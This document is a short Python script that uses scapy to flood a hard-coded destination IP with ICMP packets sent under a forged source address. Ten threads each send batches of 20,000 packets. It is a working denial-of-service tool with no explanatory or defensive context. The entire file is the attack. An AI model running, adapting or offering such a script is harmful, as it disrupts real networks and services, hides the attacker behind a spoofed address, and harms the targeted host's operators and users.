import sys
import threading
from queue import Queue
from scapy.all import *


def launch():
        p = (IP(src="35.202.52.200", dst="35.193.17.254") / ICMP())
        send(p, count=20000)


NUMBER_OF_WORKERS = 10
NUMBER_OF_JOBS = 10
q = Queue()


def create_thread():
    for i in range(NUMBER_OF_WORKERS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()


def create_jobs():
    for my_worker in range(NUMBER_OF_JOBS):
        q.put(my_worker)
    q.join()


def worker():
    for x in range(NUMBER_OF_JOBS):
        my_worker = q.get()  # get job and remove from que
        launch()
        q.task_done()  # when task is complete


create_thread()
create_jobs()
worker()

